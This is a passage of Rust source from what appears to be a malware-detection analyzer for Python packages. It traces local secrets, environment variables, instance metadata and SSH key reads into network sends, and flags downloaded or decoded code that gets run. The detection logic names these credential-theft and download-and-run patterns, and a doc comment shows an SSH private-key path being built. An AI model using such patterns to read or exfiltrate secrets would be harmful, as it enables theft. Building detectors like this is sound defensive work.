                        crate::received::command_runs(sup.p(), seg, &k[1..])
                    });
                    if let Some(seg) = seg {
                        let interp = pystr::split_ws(seg).first().and_then(|w| interp_name(w));
                        self.sc_dropped(&w, interp, at);
                        return Ok(());
                    }
                }
            }
        }
        Ok(())
    }

    /// The parts a command line is made of: a sum's operands, an
    /// f-string's pieces (a hole: its value), else the node.
    fn sc_parts(&self, n: NodeId) -> Vec<Part<NodeId>> {
        let t = self.t();
        match t.kind(n) {
            Kind::BinOp if t.node(n).op == pt::ADD => {
                let mut out = self.sc_parts(a_(t, n));
                out.extend(self.sc_parts(b_(t, n)));
                out
            }
            Kind::JoinedStr => t
                .list(a_(t, n))
                .iter()
                .map(|&v| match self.sc_const_str(v) {
                    Some(s) => Part::Text(s),
                    None => Part::Expr(if t.kind(v) == Kind::FormattedValue { a_(t, v) } else { v }),
                })
                .collect(),
            _ => match self.sc_const_str(n) {
                Some(s) => vec![Part::Text(s)],
                None => vec![Part::Expr(n)],
            },
        }
    }

    /// A program run that the script decodes: code it decodes.
    fn sc_decoded_program(&mut self, v: &Taint, at: u32) {
        if !(v.source && self.emit) {
            return;
        }
        if let Some(from) = v.sc.as_ref().and_then(|sc| decoded_at(sc)) {
            self.findings.push(Out::Decoded { at, from });
        }
    }

    /// The finding for a written file run: what it held decoded or carved
    /// out of another file, or downloaded and run by an interpreter.
    fn sc_dropped(&mut self, w: &Written, interp: Option<PyStr>, at: u32) {
        let interp = script_interp(w, interp);
        if w.kinds & (K_DECODED | K_CARVED) == 0 && interp.is_none() {
            return; // (a program downloaded and run: what installers of binaries do)
        }
        self.findings.push(Out::Dropped { at, from: w.at, kinds: w.kinds, what: w.what.clone(), interp });
    }

    /// supply mode: a slice of a binary read that skips its start
    /// (`data[offset:]`): bytes carved out of the file (K_CARVED).
    pub(super) fn sc_carved(&self, slice: NodeId, v: &Taint, at: u32) -> Option<Taint> {
        let sc = v.sc.as_ref()?;
        if sc.kinds & K_BYTES == 0 {
            return None;
        }
        let t = self.t();
        if t.kind(slice) != Kind::Slice {
            return None;
        }
        let lower = a_(t, slice);
        if lower == NONE || (t.kind(lower) == Kind::Constant && eq(t.str(a_(t, lower)), "0")) {
            return None;
        }
        let bit = bit_index(K_BYTES);
        let what = sc.firsts.iter().find(|(k, _, _)| *k == bit).map(|(_, w, _)| (**w).clone()).unwrap_or_default();
        Some(v.plain().union(&self.sc_source(K_CARVED, what, at, 0)))
    }

    /// Does a shell's command line begin with a fixed program that is not
    /// an interpreter given code (`_DL_EMBED_RE`): what it is given is that
    /// program's argument, not code run?
    fn sc_fixed_program(&self, n: NodeId) -> bool {
        let head = match self.sc_head_text(n) {
            Some(h) => h,
            None => return false,
        };
        if pystr::strip(&head).is_empty() {
            return false;
        }
        // (a whole constant is no data: only a head with data after it)
        if self.t().kind(n) == Kind::Constant {
            return false;
        }
        let nd = self.t().node(n);
        let sup = self.sup();
        sup.p().re("_DL_EMBED_RE").match_(sup.span(nd.start, nd.end)).is_none()
    }

    /// The keyword argument `name` of a call, if given.
    fn sc_keyword(&self, call: NodeId, name: &str) -> Option<NodeId> {
        let t = self.t();
        for &k in t.list(c_(t, call)) {
            let karg = a_(t, k);
            if karg != NONE && eq(t.str(karg), name) {
                return Some(b_(t, k));
            }
        }
        None
    }

    /// The received-code sink a call is, if any.
    fn sc_runs(&mut self, call: NodeId, names: &[PyStr]) -> Option<Runs> {
        if any_of(names, RUNNERS) {
            return Some(Runs { cat: RUN_CODE, from: 0 });
        }
        if any_of(names, SHELLS) {
            return Some(Runs { cat: RUN_CODE, from: 0 });
        }
        if any_of(names, SPAWNS) {
            if let Some(sh) = self.sc_keyword(call, "shell") {
                let t = self.t();
                if t.kind(sh) == Kind::Constant && t.node(sh).op == pt::V_TRUE {
                    return Some(Runs { cat: RUN_CODE, from: 0 });
                }
            }
        }
        if any_of(names, IMPORTERS) {
            return Some(Runs { cat: LOAD_NAME, from: 0 });
        }
        if any_of(names, DESERIALIZERS) {
            if names.iter().any(|n| eq(n, "yaml.load")) {
                // (a safe loader runs nothing)
                if let Some(loader) = self.sc_keyword(call, "Loader") {
                    let text = self.node_text(loader);
                    if pystr::contains(&text, "Safe") || pystr::contains(&text, "BaseLoader") {
                        return None;
                    }
                } else {
                    let t = self.t();
                    let args = t.list(b_(t, call));
                    if let Some(&second) = args.get(1) {
                        let text = self.node_text(second);
                        if pystr::contains(&text, "Safe") || pystr::contains(&text, "BaseLoader") {
                            return None;
                        }
                    }
                }
            }
            return Some(Runs { cat: DESERIALIZE, from: 0 });
        }
        None
    }

    /// The os, socket, platform and getpass modules' names for the machine:
    /// a read of local data, by the names a callee resolves to.
    fn sc_module_source(&self, names: &[PyStr], at: u32) -> Option<Taint> {
        let sup = self.sup();
        let p = sup.p();
        for n in names {
            let k = match n.iter().rposition(|&c| c == 0x2E) {
                Some(k) => k,
                None => continue,
            };
            let (module, member) = (&n[..k], &n[k + 1..]);
            if !is_one(module, &["os", "socket", "platform", "getpass"]) {
                continue;
            }
            if let Some((_, kind)) = crate::flow::module_names(p, module).into_iter().find(|(name, _)| name.as_slice() == member) {
                let what = u("user or host name");
                return Some(self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, 0));
            }
        }
        None
    }

    /// What a read names: its argument's text, or what the name it is given
    /// was given (`p = os.path.join(os.path.expanduser('~'), '.ssh', 'id_rsa')`).
    fn sc_read_what(&self, arg: NodeId) -> PyStr {
        let sup = self.sup();
        let text = self.node_text(arg);
        let p = sup.p();
        let what = match p.re("_LD_PLAIN_LITERAL_RE").match_(&text) {
            Some(pl) => pl.group(2).unwrap_or(&[]).to_vec(),
            None => text.clone(),
        };
        if self.t().kind(arg) == Kind::Name {
            if let Some(v) = sup.outside_values.borrow().get(pystr::strip(&text)) {
                if cred_store(p, v) {
                    return shown_what(p, v);
                }
            }
        }
        shown_what(p, &what)
    }

    /// A call that reads local data: its value, if it is one.
    fn sc_source_call(&mut self, call: NodeId, names: &[PyStr], recv: &Taint, pos: &[Taint]) -> Option<Taint> {
        let sup = self.sup();
        let p = sup.p();
        let at = self.start(call);
        if let Some(v) = self.sc_module_source(names, at) {
            return Some(v);
        }
        let args: Vec<NodeId> = {
            let t = self.t();
            t.list(b_(t, call)).to_vec()
        };
        let first = args.first().copied();
        let member = self.t().kind(a_(self.t(), call)) == Kind::Attribute;
        // the environment: os.getenv(name), os.environ.get(name), …
        let method = {
            let t = self.t();
            let func = a_(t, call);
            if t.kind(func) == Kind::Attribute {
                Some(t.str(b_(t, func)).to_vec())
            } else {
                None
            }
        };
        let env_get = names.iter().any(|n| eq(n, "os.getenv") || eq(n, "os.getenvb"))
            || (recv.marks & OBJ_ENV != 0 && method.as_deref().is_some_and(|m| is_one(m, &["get", "pop", "setdefault"])));
        if env_get {
            if let Some(f) = first {
                if let Some(name) = self.sc_const_str(f) {
                    return Some(self.sc_env_var(&name, at));
                }
                if let Some(v) = pos.first() {
                    for &k in v.params.iter() {
                        self.sink_adds.push((k, ENV_NAME, (self.f, at)));
                    }
                }
            }
            return Some(Taint::empty());
        }
        // what a command prints (a download's is received: sc_call)
        if any_of(names, CAPTURES) {
            let f = first?;
            if let Some(line) = self.sc_command_line(f) {
                if p.re("_LD_METADATA_RE").search(&line).is_some() {
                    return Some(self.sc_source(K_CREDENTIALS, u("the instance's metadata"), at, 0));
                }
                if let Some((kind, what)) = crate::shell::sh_output_data(p, &line, 0, None).into_iter().next() {
                    return Some(self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, 0));
                }
                return None;
            }
            // (a command taken from a constant list: what any of them prints)
            if let Some(commands) = self.sc_const_strs(f, 0) {
                let mut out = Taint::empty();
                for c in commands {
                    if let Some((kind, what)) = crate::shell::sh_output_data(p, &c, 0, None).into_iter().next() {
                        out = out.union(&self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, 0));
                    }
                }
                if out.tainted() {
                    return Some(out);
                }
            }
            // (a parameter: the script's own wrapper of exec, for its callers)
            if let Some(v) = pos.first() {
                for &k in v.params.iter() {
                    self.sink_adds.push((k, EXEC_CMD, (self.f, at)));
                }
            }
            return None;
        }
        // the home folder: a path outside the package
        if names.iter().any(|n| is_one(n, &["pathlib.Path.home", "Path.home", "os.path.expanduser"])) && member {
            let home = names.iter().any(|n| last(n) == pystr::u("home").as_slice());
            if home || first.is_some_and(|f| self.sc_const_str(f).is_some_and(|s| s.first() == Some(&0x7E))) {
                let what = self.node_text(call);
                let base = pos.first().map(|v| v.plain()).unwrap_or_else(Taint::empty);
                return Some(self.sc_source(K_PATH, pystr::upto(&what, 60).to_vec(), at, 0).union(&base));
            }
        }
        // a file outside the package
        let readers = p.strs("_LD_READERS");
        let not_reads = p.strs("_LD_NOT_READS");
        let lastname: PyStr = names.first().map(|n| last(n).to_vec()).unwrap_or_default();
        let reader = readers.iter().any(|r| r.as_slice() == lastname.as_slice()) && !not_reads.iter().any(|r| r.as_slice() == lastname.as_slice());
        // `Path(…).read_text()`, `p.open()`, `p.iterdir()`: the receiver is the path
        let path_read = member && is_one(&lastname, &["read_text", "read_bytes", "readlines", "open", "iterdir", "glob", "rglob"]);
        if path_read {
            if let Some(sc) = &recv.sc {
                if let Some((_, what, _)) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PATH) {
                    let obj = a_(self.t(), a_(self.t(), call));
                    let (lo, hi) = (self.t().node(obj).start, self.t().node(obj).end);
                    let what = if crate::flow::ld_outside(p, &sup.text, lo as usize, hi as usize, true, &sup.outside.borrow(), &sup.lit) {
                        self.sc_read_what(obj)
                    } else {
                        pystr::upto(what, 60).to_vec()
                    };
                    return Some(self.sc_source(K_FILE, what, at, 0));
                }
            }
            // (a file shipped with it: what it holds is the script's own)
            if recv.sc.as_ref().is_some_and(|s| s.kinds & K_OWN != 0) {
                return Some(self.sc_source(K_OWN, u("a file shipped with it"), at, 0));
            }
            if first.is_none() || !is_one(&lastname, &["open", "glob"]) {
                return None;
            }
        }
        // a path, not yet a read: `Path(x)`
        let path_made = names.iter().any(|n| is_one(last(n), &["Path", "PurePath", "PosixPath", "WindowsPath"]));
        if reader || path_made {
            let f = match first {
                Some(f) => f,
                None => return None,
            };
            let (lo, hi) = {
                let n = self.t().node(f);
                (n.start, n.end)
            };
            let outside = crate::flow::ld_outside(p, &sup.text, lo as usize, hi as usize, true, &sup.outside.borrow(), &sup.lit);
            if outside {
                let what = self.sc_read_what(f);
                return Some(self.sc_source(if path_made { K_PATH } else { K_FILE }, what, at, 0));
            }
            if path_made {
                // (a path given a path: still that path; anything else, not local data)
                return Some(pos.first().filter(|v| v.sc.as_ref().is_some_and(|s| s.kinds & (K_PATH | K_OWN) != 0)).map(|v| v.plain()).unwrap_or_else(Taint::empty));
            }
            // (a path outside the package given it: a name, a parameter)
            if let Some(sc) = pos.first().and_then(|v| v.sc.clone()) {
                if let Some((_, what, _)) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PATH) {
                    return Some(self.sc_source(K_FILE, pystr::upto(what, 60).to_vec(), at, 0));
                }
            }
            // (a file shipped with it: what it holds is the script's own)
            if pos.first().and_then(|v| v.sc.as_ref()).is_some_and(|s| s.kinds & K_OWN != 0) {
                return Some(self.sc_source(K_OWN, u("a file shipped with it"), at, 0));
            }
            // (a parameter: the script's own reader, for its callers)
            if let Some(v) = pos.first() {
                for &k in v.params.iter() {
                    self.sink_adds.push((k, READ_PATH, (self.f, at)));
                }
            }
            // (what a file holds is not what its path was made of)
            return Some(Taint::empty());
        }
        // the instance's metadata, the machine's public IP address
        let fetch = any_of(names, FETCHERS)
            || (recv.marks & OBJ_CLIENT != 0 && method.as_deref().is_some_and(|m| is_one(m, &["get", "request", "urlopen"])));
        if fetch {
            if let (Some(&f), Some(&l)) = (args.first(), args.last()) {
                let (lo, hi) = (self.t().node(f).start, self.t().node(l).end);
                let mut texts: Vec<PyStr> = vec![sup.span(lo, hi).to_vec()];
                // (an address a name holds: what it was given)
                if self.t().kind(f) == Kind::Name {
                    if let Some(values) = self.sc_const_strs(f, 0) {
                        texts.extend(values);
                    }
                }
                if texts.iter().any(|t| p.re("_LD_METADATA_RE").search(t).is_some()) {
                    return Some(self.sc_source(K_CREDENTIALS, u("the instance's metadata"), at, 0));
                }
                if texts.iter().any(|t| p.re("_LD_PUBLIC_IP_RE").search(t).is_some()) {
                    return Some(self.sc_source(K_ADDRESS, u("the machine's public IP address"), at, 0));
                }
            }
        }
        None
    }

    /// A send: what reaches its arguments, by role.
    fn sc_send(&mut self, call: NodeId, spec: Spec, pos: &[Taint], starred: Option<&Taint>, kws: &[(NameId, Taint)], dstar: Option<&Taint>) {
        let at = self.start(call);
        let sup = self.sup();
        let p = sup.p();
        let arg_nodes: Vec<NodeId> = {
            let t = self.t();
            t.list(b_(t, call)).to_vec()
        };
        for (i, v) in pos.iter().enumerate() {
            let address = (spec.addresses < 0 || (spec.addresses > 0 && (i as i8) < spec.addresses)) && v.marks & OBJ_REQUEST == 0;
            if spec.composed {
                match arg_nodes.get(i) {
                    Some(&n) if self.sc_composed(n) || self.sc_composed_name(n) => {}
                    _ => continue,
                }
            }
            self.sc_reach(&v.plain(), if address { SEND_ADDR } else { SEND_DATA }, at);
        }
        if let Some(s) = starred {
            self.sc_reach(&s.plain(), if spec.addresses < 0 { SEND_ADDR } else { SEND_DATA }, at);
        }
        if spec.composed {
            return;
        }
        let option_keys = p.strs("_LD_OPTION_KEYS");
        let process_keys = p.strs("_LD_PROCESS_KEYS");
        for (name, v) in kws {
            let text = self.p.name_text(*name).to_vec();
            if spec.process && process_keys.iter().any(|k| k.as_slice() == text.as_slice()) {
                continue; // (the program's options: not sent)
            }
            let address = spec.addresses < 0 || option_keys.iter().any(|k| k.as_slice() == text.as_slice());
            self.sc_reach(&v.plain(), if address { SEND_ADDR } else { SEND_DATA }, at);
        }
        if let Some(d) = dstar {
            self.sc_reach(&d.plain(), if spec.addresses < 0 { SEND_ADDR } else { SEND_DATA }, at);
        }
    }

    /// Is a receiving call's address the script's own (a constant, what the
    /// script read or received, anything its caller doesn't give it) rather
    /// than one a caller gives (a library's request for its user)?
    fn sc_own_address(&mut self, call: NodeId, index: usize, pos: &[Taint], kws: &[(NameId, Taint)]) -> bool {
        let node = {
            let t = self.t();
            t.list(b_(t, call)).get(index).copied()
        };
        if let Some(n) = node {
            let v = pos.get(index);
            if v.is_some_and(|v| v.source && v.params.is_empty()) {
                return true;
            }
            return !self.sc_from_caller(n, v);
        }
        // url=…
        if let Some(n) = self.sc_keyword(call, "url") {
            let url_id = self.p.names.find(&u("url"));
            let v = kws.iter().find(|(k, _)| Some(*k) == url_id).map(|(_, v)| v);
            if v.is_some_and(|v| v.source && v.params.is_empty()) {
                return true;
            }
            return !self.sc_from_caller(n, v);
        }
        false
    }

    /// Does a call's command line download (curl or wget first)? What it
    /// prints is received.
    fn sc_download(&self, call: NodeId) -> bool {
        let first = {
            let t = self.t();
            match t.list(b_(t, call)).first() {
                Some(&f) => f,
                None => return false,
            }
        };
        let head = match self.sc_command_head(first) {
            Some(h) => h,
            None => return false,
        };
        let whole = self.node_text(first);
        let mut both = head.clone();
        both.push(0x20);
        both.extend_from_slice(&whole);
        let sup = self.sup();
        // (a list's items: their text joined is the command line's)
        let line = if matches!(self.t().kind(first), Kind::List | Kind::Tuple) {
            self.sc_command_line(first).unwrap_or(head.clone())
        } else {
            head.clone()
        };
        downloads(sup.p(), &line) && downloads(sup.p(), &both)
    }

    /// The functions a node may be (a function's name given as a value).
    fn sc_fn_targets(&mut self, n: NodeId) -> Result<Vec<(FnId, bool)>, Halt> {
        let kind = self.t().kind(n);
        if !matches!(kind, Kind::Name | Kind::Attribute) {
            return Ok(Vec::new());
        }
        let mut out = Vec::new();
        // self.method
        if kind == Kind::Attribute {
            let (v, attr_s) = {
                let t = self.t();
                (a_(t, n), b_(t, n))
            };
            let attr = self.name_of(attr_s);
            if let Some(Recv::Instance(c)) = self.p.receiver(self.f, v)? {
                for g in self.p.lookup_method(c, attr)? {
                    out.push((g, self.p.fns[g as usize].kind != FnKind::Static));
                }
                return Ok(out);
            }
        }
        for t in self.p.expr_targets(self.m, n)?.iter() {
            if let Target::Func(g) = *t {
                out.push((g, false));
            }
        }
        if out.is_empty() && kind == Kind::Name {
            let sid = a_(self.t(), n);
            let id = self.name_of(sid);
            if let Some(fs) = self.p.mods[self.m as usize].nested.get(&id) {
                out.extend(fs.iter().map(|&g| (g, false)));
            }
        }
        Ok(out)
    }

    /// A thread's, a timer's or an executor's call of a function: what it
    /// is given reaches its parameters as from a call.
    fn sc_started(&mut self, call: NodeId, names: &[PyStr], method: Option<&[u32]>) -> Result<(), Halt> {
        let args: Vec<NodeId> = {
            let t = self.t();
            t.list(b_(t, call)).to_vec()
        };
        let (target, given): (Option<NodeId>, Vec<NodeId>) = if any_of(names, STARTERS) {
            let timer = names.iter().any(|n| eq(n, "threading.Timer"));
            let target = self.sc_keyword(call, if timer { "function" } else { "target" }).or_else(|| args.get(1).copied());
            let given = match self.sc_keyword(call, "args").or_else(|| args.get(if timer { 2 } else { 3 }).copied()) {
                Some(a) => {
                    let t = self.t();
                    if matches!(t.kind(a), Kind::Tuple | Kind::List) {
                        t.list(a_(t, a)).to_vec()
                    } else {
                        Vec::new()
                    }
                }
                None => Vec::new(),
            };
            (target, given)
        } else if method.is_some_and(|m| eq(m, "submit") || eq(m, "apply_async") || eq(m, "to_thread")) || names.iter().any(|n| eq(n, "asyncio.to_thread")) {
            (args.first().copied(), args.iter().skip(1).copied().collect())
        } else if method.is_some_and(|m| eq(m, "run_in_executor")) {
            (args.get(1).copied(), args.iter().skip(2).copied().collect())
        } else {
            (None, Vec::new())
        };
        let target = match target {
            Some(t) => t,
            None => return Ok(()),
        };
        let fids = self.sc_fn_targets(target)?;
        if fids.is_empty() {
            return Ok(());
        }
        let mut vals = Vec::with_capacity(given.len());
        for g in given {
            vals.push(self.expr(g)?);
        }
        let at = self.start(call);
        self.sc_apply(call, &fids, &vals, None, &[], None, at);
        Ok(())
    }

    /// The script's own functions called with these values: what reaches a
    /// send or a received-code sink in them is the finding (or, holding the
    /// caller's parameters, the caller's summary); what a wrapper of exec,
    /// of a read, of the environment or of a download gives is local data
    /// or received. The call's value.
    pub(super) fn sc_apply(
        &mut self,
        call: NodeId,
        targets: &[(FnId, bool)],
        pos: &[Taint],
        starred: Option<&Taint>,
        kws: &[(NameId, Taint)],
        dstar: Option<&Taint>,
        at: u32,
    ) -> Taint {
        let mut out = Taint::empty();
        let arg_nodes: Vec<NodeId> = {
            let t = self.t();
            if t.kind(call) == Kind::Call {
                t.list(b_(t, call)).to_vec()
            } else {
                Vec::new()
            }
        };
        for &(g, skip) in targets {
            let bound = super::eval::bind(&self.p.fns[g as usize], pos, starred, kws, dstar, skip);
            let pts = self.p.fns[g as usize].param_to_sink.clone();
            // (the index of a parameter among the call's positional arguments)
            let all_pos: Vec<NameId> = {
                let gf = &self.p.fns[g as usize];
                let v: Vec<NameId> = gf.posonly.iter().chain(gf.args.iter()).copied().collect();
                if skip && !v.is_empty() {
                    v[1..].to_vec()
                } else {
                    v
                }
            };
            for (pname, cats) in pts {
                let t = bound.iter().find(|(k, _)| *k == pname).map(|(_, t)| t.clone());
                let index = all_pos.iter().position(|&x| x == pname);
                let by_keyword: Option<NodeId> = {
                    let text = self.p.name_text(pname).to_vec();
                    let tr = self.t();
                    if tr.kind(call) == Kind::Call {
                        tr.list(c_(tr, call)).iter().find(|&&k| a_(tr, k) != NONE && tr.str(a_(tr, k)) == text.as_slice()).map(|&k| b_(tr, k))
                    } else {
                        None
                    }
                };
                for (c, loc) in cats {
                    match &t {
                        Some(t) if t.tainted() => {
                            for &q in t.params.iter() {
                                self.sink_adds.push((q, c, loc));
                            }
                            if t.source && self.emit {
                                if let Some(sc) = t.sc.clone() {
                                    if c == SEND_DATA || c == SEND_ADDR {
                                        self.sc_emit(&sc, c == SEND_ADDR, loc.1);
                                    } else if sc.kinds & K_RECEIVED != 0 {
                                        if let Some(name) = received_cat(c) {
                                            self.findings.push(Out::Received { at: loc.1, cat: name });
                                        }
                                    }
                                    // (code the script reads back from itself, run by the callee)
                                    if c == RUN_CODE && sc.kinds & K_OWN != 0 {
                                        self.findings.push(Out::Own { at: loc.1 });
                                    }
                                    // (code the script decodes, run by the callee)
                                    if c == RUN_CODE {
                                        if let Some(from) = decoded_at(&sc) {
                                            self.findings.push(Out::Decoded { at: loc.1, from });
                                        }
                                    }
                                }
                            }
                        }
                        _ => {}
                    }
                    // the wrappers: given a constant (or a path outside the package)
                    let node = index.and_then(|i| arg_nodes.get(i).copied()).filter(|&n| self.t().kind(n) != Kind::Starred).or(by_keyword);
                    match c {
                        EXEC_CMD => {
                            if let Some(n) = node {
                                if let Some(v) = self.sc_wrapper_output(n, at) {
                                    out = out.union(&v);
                                }
                            }
                        }
                        READ_PATH => {
                            if let Some(sc) = t.as_ref().and_then(|t| t.sc.clone()) {
                                if let Some((_, what, _)) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PATH) {
                                    out = out.union(&self.sc_source(K_FILE, pystr::upto(what, 60).to_vec(), at, 0));
                                }
                            } else if let Some(n) = node {
                                let sup = self.sup();
                                let (lo, hi) = (self.t().node(n).start, self.t().node(n).end);
                                if crate::flow::ld_outside(sup.p(), &sup.text, lo as usize, hi as usize, true, &sup.outside.borrow(), &sup.lit) {
                                    let what = self.sc_read_what(n);
                                    out = out.union(&self.sc_source(K_FILE, what, at, 0));
                                }
                            }
                        }
                        ENV_NAME => {
                            if let Some(n) = node {
                                if let Some(name) = self.sc_const_str(n) {
                                    out = out.union(&self.sc_env_var(&name, at));
                                }
                            }
                        }
                        FETCH_RUN | FETCH_LOAD | FETCH_DESERIALIZE => {
                            // a request to the address it is given, received and run: given its own
                            if let Some(n) = node {
                                let own = match &t {
                                    Some(t) if t.source && t.params.is_empty() => true,
                                    Some(t) if !t.params.is_empty() => false,
                                    _ => !self.sc_from_caller(n, t.as_ref()),
                                };
                                if own && self.emit {
                                    if let Some(name) = fetched_name(c) {
                                        self.findings.push(Out::Received { at: loc.1, cat: name });
                                    }
                                }
                            }
                        }
                        SEND_ADDR => {
                            // the script's own downloader, given its own address
                            if let Some(n) = node {
                                let own = match &t {
                                    Some(t) if t.source && t.params.is_empty() => true,
                                    _ => !self.sc_from_caller(n, t.as_ref()),
                                };
                                if own {
                                    out = out.union(&self.sc_source(K_RECEIVED, u("a download"), at, 0));
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }
            // its value: what it returns
            let gf = &self.p.fns[g as usize];
            if let Some(rs) = &gf.ret_source {
                out = out.union(&Taint { via: Some(g), ..rs.as_source() });
            }
            let returned = gf.param_to_return.clone();
            for (pname, clean) in returned {
                if let Some((_, b)) = bound.iter().find(|(k, _)| *k == pname) {
                    if b.tainted() {
                        out = out.union(&b.sanitize(clean));
                    }
                }
            }
        }
        out
    }

    /// A call of the script's wrapper of exec given a constant command
    /// line: what the command prints.
    fn sc_wrapper_output(&self, arg: NodeId, at: u32) -> Option<Taint> {
        let command = self.sc_command_line(arg)?;
        let sup = self.sup();
        let p = sup.p();
        if p.re("_LD_METADATA_RE").search(&command).is_some() {
            return Some(self.sc_source(K_CREDENTIALS, u("the instance's metadata"), at, 0));
        }
        if downloads(p, &command) {
            return Some(self.sc_source(K_RECEIVED, u("a download"), at, 0));
        }
        let (kind, what) = crate::shell::sh_output_data(p, &command, 0, None).into_iter().next()?;
        Some(self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, 0))
    }

    /// supply mode: a call (sources, sends, connections, clients, runners,
    /// the script's own functions). Its value.
    #[allow(clippy::too_many_arguments)]
    pub(super) fn sc_call(
        &mut self,
        call: NodeId,
        res: &CallRes,
        recv: &Taint,
        pos: &[Taint],
        starred: Option<&Taint>,
        kws: &[(NameId, Taint)],
        dstar: Option<&Taint>,
    ) -> Result<Taint, Halt> {
        let func = a_(self.t(), call);
        let member = self.t().kind(func) == Kind::Attribute;
        let method: Option<PyStr> = if member {
            let t = self.t();
            Some(t.str(b_(t, func)).to_vec())
        } else {
            None
        };
        let named = |n: &str| method.as_deref().is_some_and(|m| eq(m, n));
        let names = self.sc_names(func);
        let at = self.start(call);
        let arg_nodes: Vec<NodeId> = {
            let t = self.t();
            t.list(b_(t, call)).to_vec()
        };
        // received code: code run, a module's name loaded, data deserialized
        if let Some(r) = self.sc_runs(call, &names) {
            let shell = any_of(&names, SHELLS) || any_of(&names, SPAWNS);
            let fixed = shell && arg_nodes.get(r.from).is_some_and(|&n| self.sc_fixed_program(n));
            if !fixed {
                let v = pos.get(r.from).cloned().or_else(|| starred.cloned()).unwrap_or_else(Taint::empty);
                self.sc_reach(&v.plain(), r.cat, at);
            }
        }
        // an interpreter given code as an argument: [sys.executable, '-c', code]
        if any_of(&names, SPAWNS) || any_of(&names, &["os.execv", "os.execvp", "os.spawnv", "os.spawnvp", "pty.spawn"]) {
            let list = arg_nodes.iter().copied().find(|&n| matches!(self.t().kind(n), Kind::List | Kind::Tuple));
            if let Some(l) = list {
                if let Some(code) = self.sc_interp_code(l) {
                    let v = self.expr(code)?;
                    self.sc_reach(&v.plain(), RUN_CODE, at);
                }
            }
        }
        if names.iter().any(|n| eq(n, "asyncio.create_subprocess_exec")) && !arg_nodes.is_empty() && self.sc_interpreter(arg_nodes[0]) {
            for k in 1..arg_nodes.len().min(8) {
                if self.sc_const_str(arg_nodes[k]).is_some_and(|s| is_one(&s, EVAL_FLAGS)) {
                    if let Some(v) = pos.get(k + 1) {
                        self.sc_reach(&v.plain(), RUN_CODE, at);
                    }
                    break;
                }
            }
        }
        // threads, timers and executors: the function they call
        if any_of(&names, STARTERS) || method.as_deref().is_some_and(|m| is_one(m, &["submit", "apply_async", "run_in_executor", "to_thread"])) || names.iter().any(|n| eq(n, "asyncio.to_thread")) {
            self.sc_started(call, &names, method.as_deref())?;
        }
        // a file written, then run: what is written where, a run of it (a
        // file opened to write and read, `'a+'`, is read too)
        let opened = self.sc_open_mode(call, &names, method.as_deref());
        let file = self.sc_file_write(call, &names, method.as_deref(), recv, pos, opened.as_ref());
        if let Some((f, false)) = &file {
            return Ok(f.clone());
        }
        self.sc_file_run(call, &names, pos)?;
        let bytes = self.sc_binary_read(call, method.as_deref(), opened.as_ref());
        // a read of local data: its value
        if let Some(src) = self.sc_source_call(call, &names, recv, pos) {
            let src = match file {
                Some((f, _)) => src.union(&f),
                None => src,
            };
            return Ok(match bytes {
                Some(b) => src.union(&b),
                None => src,
            });
        }
        // sends
        let mut spec = send_spec(&names);
        if spec.is_none() && member && recv.marks & OBJ_CLIENT != 0 {
            let m = method.as_deref().unwrap_or(&[]);
            if is_one(m, CLIENT_POSTS) {
                spec = Some(SEND1);
            } else if is_one(m, CLIENT_REQUESTS) {
                spec = Some(REQUEST2);
            } else if is_one(m, CLIENT_GETS) {
                spec = Some(ADDRESS);
            }
        }
        if spec.is_none() && member && recv.marks & OBJ_CONN != 0 && method.as_deref().is_some_and(|m| is_one(m, CONN_WRITES)) {
            spec = Some(OPTIONS);
        }
        if spec.is_none() && member && method.as_deref().is_some_and(|m| is_one(m, &["post", "put", "patch", "request"])) {
            // (an object named a session or a client, made where the model
            // doesn't see: the text follower's `session.post(`, `client.request(`)
            let obj = a_(self.t(), func);
            let t = self.t();
            let named_as = match t.kind(obj) {
                Kind::Name => Some(t.str(a_(t, obj)).to_vec()),
                Kind::Attribute => Some(t.str(b_(t, obj)).to_vec()),
                _ => None,
            };
            if named_as.as_deref().is_some_and(|n| eq(n, "session") || eq(n, "client")) {
                spec = Some(if named("request") { REQUEST2 } else { SEND1 });
            }
        }
        if spec.is_none() && any_of(&names, PROCESSES) {
            // a network program run with data on its command line
            if let (Some(&f), Some(&l)) = (arg_nodes.first(), arg_nodes.last()) {
                let sup = self.sup();
                let (lo, hi) = (self.t().node(f).start, self.t().node(l).end);
                if sup.p().re("_LD_NET_PROGRAM_RE").search(sup.span(lo, hi)).is_some() {
                    spec = Some(PROCESS);
                }
            }
        }
        if let Some(spec) = spec {
            self.sc_send(call, spec, pos, starred, kws, dstar);
        }
        // `'https://{}.x.com'.format(h)`: what goes into the host name
        if named("format") {
            let obj = a_(self.t(), func);
            if let Some(text) = self.sc_const_str(obj) {
                let head: PyStr = match text.iter().position(|&c| c == 0x7B) {
                    Some(k) => text[..k].to_vec(),
                    None => Vec::new(),
                };
                if !head.is_empty() && host_prefix(&head) {
                    let held = super::union_all(pos.iter().chain(kws.iter().map(|(_, v)| v)));
                    let o = self.start(obj);
                    self.sc_reach(&held.plain(), SEND_DATA, o);
                }
            }
        }
        // what the call receives (a response, a connection's data): its
        // value, from the script's own address (what a library requests
        // for its caller is not the script's download)
        let client_call = member && recv.marks & OBJ_CLIENT != 0 && method.as_deref().is_some_and(|m| {
            is_one(m, CLIENT_POSTS) || is_one(m, CLIENT_REQUESTS) || is_one(m, CLIENT_GETS)
        });
        let request = any_of(&names, RECEIVERS) || client_call;
        let mut got = Taint::empty();
        if request {
            let index = if any_of(&names, REQUESTS) || (client_call && method.as_deref().is_some_and(|m| is_one(m, CLIENT_REQUESTS))) {
                1
            } else {
                0
            };
            // (a request object to the instance's metadata or a public-IP service: what it gets)
            if let Some(a) = pos.get(index) {
                if a.marks & OBJ_IMDS != 0 {
                    return Ok(self.sc_source(K_CREDENTIALS, u("the instance's metadata"), at, 0));
                }
                if a.marks & OBJ_PUBLIC_IP != 0 {
                    return Ok(self.sc_source(K_ADDRESS, u("the machine's public IP address"), at, 0));
                }
            }
            if self.sc_own_address(call, index, pos, kws) {
                let what = names.first().cloned().unwrap_or_else(|| u("a request"));
                got = self.sc_source(K_RECEIVED, what, at, 0);
